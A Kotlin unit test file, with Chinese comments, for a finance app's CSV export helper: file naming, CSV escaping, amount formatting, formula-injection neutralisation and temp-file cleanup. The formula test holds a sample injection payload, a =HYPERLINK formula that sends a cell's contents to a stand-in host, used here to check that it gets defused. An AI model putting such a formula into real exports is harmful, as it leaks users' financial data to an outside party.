package com.geek.umbra.feature.money

import com.geek.umbra.app.Brand
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test

/** iOS Tools/swifttests/MoneyExportKitTests.swift 逐条照抄（D3 / 设计侧 162 §一）。 */
class MoneyExportKitTest {
    private fun range(scope: MoneyExportScope, dir: String? = null, cat: String? = null, count: Int = 37) =
        MoneyExportRange(MoneyExportKit.segments(scope, "2026-08", "2026 年 8 月", dir, cat), count)

    /** ⚠️ 162 §一 那次返工的实物。 */
    @Test fun fileNameCases() {
        assertEquals("文件名跟着三段范围走", "${Brand.productName}-账目-2026-08-支出-餐饮", range(MoneyExportScope.Filtered, "支出", "餐饮").fileBase)
        assertEquals("只有月份时就只有月份", "${Brand.productName}-账目-2026-08", range(MoneyExportScope.Filtered).fileBase)
        assertEquals("少一段就少一段", "${Brand.productName}-账目-2026-08-收入", range(MoneyExportScope.Filtered, dir = "收入").fileBase)
        assertEquals("全部那一档的文件名", "${Brand.productName}-账目-全部", range(MoneyExportScope.All).fileBase)
        val all = range(MoneyExportScope.All).fileBase
        assertTrue("「全部」的文件名里混进了月份：$all", !all.contains("2026") && !all.contains("08"))
        assertTrue("当前筛选那一档的文件名丢了月份", range(MoneyExportScope.Filtered, dir = "支出").fileBase.contains("2026-08"))
    }

    @Test fun sentenceCases() {
        assertEquals("范围句", "要导的是：2026 年 8 月 · 支出 · 餐饮 · 共 37 笔。生成一个 csv，接着挑去处。",
            range(MoneyExportScope.Filtered, "支出", "餐饮").sentence)
        assertEquals("全部那一档的范围句", "要导的是：全部账目 · 共 812 笔。生成一个 csv，接着挑去处。",
            range(MoneyExportScope.All, count = 812).sentence)
        assertEquals("主钮上的笔数", "导出这 5 笔", range(MoneyExportScope.Filtered, count = 5).actionTitle)
        assertTrue("范围句里也要有笔数", range(MoneyExportScope.Filtered, count = 5).sentence.contains("共 5 笔"))
    }

    /** 分类名是用户自己起的，什么都可能有。 */
    @Test fun safeSegCases() {
        val k = MoneyExportKit
        assertEquals("斜杠不能留（会被当路径分隔符）", "餐饮_外卖", k.safeFileSeg("餐饮/外卖"))
        assertEquals("Windows 上非法的那几个也换掉", "a_b_c_d_e_f_g_h", k.safeFileSeg("a:b*c?d\"e<f>g|h"))
        assertEquals("换行换掉", "行_内", k.safeFileSeg("行\n内"))
        assertEquals("两头空白去掉", "餐饮", k.safeFileSeg("  餐饮  "))
        assertEquals("前导点去掉（否则是个隐藏文件）", "隐藏", k.safeFileSeg("..隐藏"))
        assertEquals("空串不返回空 —— 空会拼出 `账目--支出` 这种名字", "未命名", k.safeFileSeg(""))
        assertEquals("非法字符逐个换成下划线，不是删掉", "___", k.safeFileSeg("///"))
        assertEquals("全是空白 → 未命名", "未命名", k.safeFileSeg("   "))
        assertEquals("全是点 → 未命名（否则是个隐藏文件）", "未命名", k.safeFileSeg("..."))
        assertEquals("太长的截到 40", 40, k.safeFileSeg("长".repeat(80)).length)
        assertEquals("正常的一段一个字都不动", "2026-08", k.safeFileSeg("2026-08"))
    }

    /** 金额这一格必须是裸数字。 */
    @Test fun amountCases() {
        val k = MoneyExportKit
        assertEquals("整数元", "38.00", k.yuanPlain(3800))
        assertEquals("只有分", "0.05", k.yuanPlain(5))
        assertEquals("零", "0.00", k.yuanPlain(0))
        assertEquals("负数带符号", "-38.00", k.yuanPlain(-3800))
        assertEquals("⚠️ 大额不带千分位", "1234567.89", k.yuanPlain(123_456_789))
        assertTrue("金额里不许出现逗号", !k.yuanPlain(123_456_789).contains(","))
    }

    @Test fun csvCases() {
        val k = MoneyExportKit
        assertEquals("普通一格不加引号", "餐饮", k.csvCell("餐饮"))
        assertEquals("含逗号要加引号", "\"a,b\"", k.csvCell("a,b"))
        assertEquals("引号自身翻倍", "\"说\"\"话\"\"\"", k.csvCell("说\"话\""))
        assertEquals("含换行要加引号", "\"一\n二\"", k.csvCell("一\n二"))

        val row = MoneyExportKit.Row("2026-08-31 23:30", "支出", "餐饮", "外卖", "38.00", "楼下,那家", "NO1", "凭证", "m_1")
        val text = k.csvText(listOf(row))
        assertTrue("CSV 开头少了 UTF-8 BOM", text.startsWith("﻿"))
        val lines = text.split("\r\n")
        assertTrue("CSV 至少要有表头和一行", lines.size >= 2)
        assertEquals("表头与 PC 的 COLUMNS 逐字同源", "﻿日期时间,方向,分类,二级分类,金额（元）,商家/备注,订单号,附件,流水ID", lines[0])
        assertEquals("一行的样子（含逗号那格加了引号）", "2026-08-31 23:30,支出,餐饮,外卖,38.00,\"楼下,那家\",NO1,凭证,m_1", lines[1])
        assertEquals("一行的格数要和表头对上", k.columns.size, row.cells.size)
    }

    /** umbra-ios#26：CSV 公式注入中和，规则与 PC 端 buildCsv 逐字一致。 */
    @Test fun formulaCases() {
        val n = MoneyExportKit::neutralizeFormula
        assertEquals("= 开头", "'=1+1", n("=1+1"))
        assertEquals("+ 开头", "'+86 138", n("+86 138"))
        assertEquals("- 开头的文本", "'-那家", n("-那家"))
        assertEquals("@ 开头", "'@SUM(A1)", n("@SUM(A1)"))
        assertEquals("制表符开头", "'\tTAB", n("\tTAB"))
        assertEquals("回车开头", "'\rCR", n("\rCR"))
        assertEquals("非首字符的 - 不动", "楼下-那家", n("楼下-那家"))
        assertEquals("非首字符的 = 不动", "a=b", n("a=b"))
        assertEquals("空串不动", "", n(""))
        assertEquals("单引号开头的不再加（它本身不是前导符）", "'=已经中和过", n("'=已经中和过"))

        val evil = MoneyExportKit.Row("2026-08-31 23:30", "支出", "@分类", "-二级", "-12.50",
            "=HYPERLINK(\"https://x.example/?d=\"&E2,\"点此\")", "+123", "=a.png", "m_2")
        val line = MoneyExportKit.csvText(listOf(evil)).split("\r\n")[1]
        assertEquals("文本格中和后再转义、金额格原样",
            "2026-08-31 23:30,支出,'@分类,'-二级,-12.50," +
                "\"'=HYPERLINK(\"\"https://x.example/?d=\"\"&E2,\"\"点此\"\")\"," +
                "'+123,'=a.png,m_2", line)
        assertEquals("金额列的负数被中和成了文本", "-12.50", evil.cells[4])
        assertEquals("第 5 列不再是金额 —— 负数那条断言指错了列", "金额（元）", MoneyExportKit.columns[4])
    }

    /** 台账 export-rcpt-filter-mislabeled：待补票那一筛开着时导出。 */
    @Test fun rcptCases() {
        val full = MoneyExportRcpt("2026-12", "2026 年第 4 季", 7, 7)
        val cut = MoneyExportRcpt("2026-12", "2026 年第 4 季", 640, 500)
        fun r(rc: MoneyExportRcpt?, dir: String? = null, count: Int = 7) = MoneyExportRange(
            MoneyExportKit.segments(MoneyExportScope.Filtered, "2026-08", "2026 年 8 月", dir, null, rc), count, rc)
        assertEquals("待补票那一筛的文件名", "${Brand.productName}-账目-待补票-截至2026-12", r(full).fileBase)
        assertTrue("待补票那一筛的文件名里还写着正在看的那个月（内容是整季含往季）", !r(full).fileBase.contains("2026-08"))
        assertEquals("方向筛选照样跟在后面", "${Brand.productName}-账目-待补票-截至2026-12-支出", r(full, "支出").fileBase)
        assertEquals("没截断时范围句不多话",
            "要导的是：待补票（截至 2026 年第 4 季，含往季） · 共 7 笔。生成一个 csv，接着挑去处。", r(full).sentence)
        assertEquals("被 limit 截断时范围句要说出来",
            "要导的是：待补票（截至 2026 年第 4 季，含往季） · 共 500 笔。" +
                "待补票一共 640 笔，这里只拿到了最近的 500 笔，没拿到的不在这份文件里。生成一个 csv，接着挑去处。",
            r(cut, count = 500).sentence)
        assertTrue("截断判据：拿回来的比总数少才算", cut.truncated && !full.truncated)
        assertEquals("没开待补票时文件名照旧按月", "${Brand.productName}-账目-2026-08", r(null).fileBase)
        assertEquals("全部那一档混进了待补票口径", "全部",
            MoneyExportKit.segments(MoneyExportScope.All, "2026-08", "2026 年 8 月", null, null, full).joinToString("") { it.slug })
    }

    /** 台账 export-plaintext-left-in-tmp：清理只认导出自己的东西。 */
    @Test fun tmpCases() {
        val k = MoneyExportKit
        assertTrue("这一版的导出目录要被清", k.isExportTmp(k.TMP_DIR_PREFIX + "3F2A-..."))
        assertTrue("旧版散在 tmp 根上的 csv 要被清", k.isExportTmp("umbra-账目-2026-08.csv"))
        assertTrue("旧版的 zip 要被清", k.isExportTmp("umbra-账目-全部-凭证图.zip"))
        assertTrue("旧版打包前的原图目录要被清", k.isExportTmp("umbra-账目-2026-08"))
        assertTrue("清到了图片预览器的分享目录", !k.isExportTmp("share"))
        assertTrue("清到了知识库预览的临时目录", !k.isExportTmp("kb-preview"))
        assertTrue("前缀差一个字也被当成了导出目录", !k.isExportTmp("umbra-money-exportx"))
        assertTrue("清到了系统的临时文件", !k.isExportTmp("CFNetworkDownload_x.tmp"))
        assertTrue("只有前缀本身不该算", !k.isExportTmp(k.TMP_DIR_PREFIX))
        assertTrue("这一版的 csv 文件名不在清理范围里", k.isExportTmp(range(MoneyExportScope.Filtered).fileBase + ".csv"))
        // 品牌改名（10-22）：这一版的前缀跟着 Brand 走，旧前缀照样认（升级前留下的那几份明文）。
        assertTrue("改名后这一版的 zip 要被清", k.isExportTmp("${Brand.productName}-账目-全部-凭证图.zip"))
        assertTrue("只有新前缀本身不该算", !k.isExportTmp(k.FILE_PREFIX))
    }
}
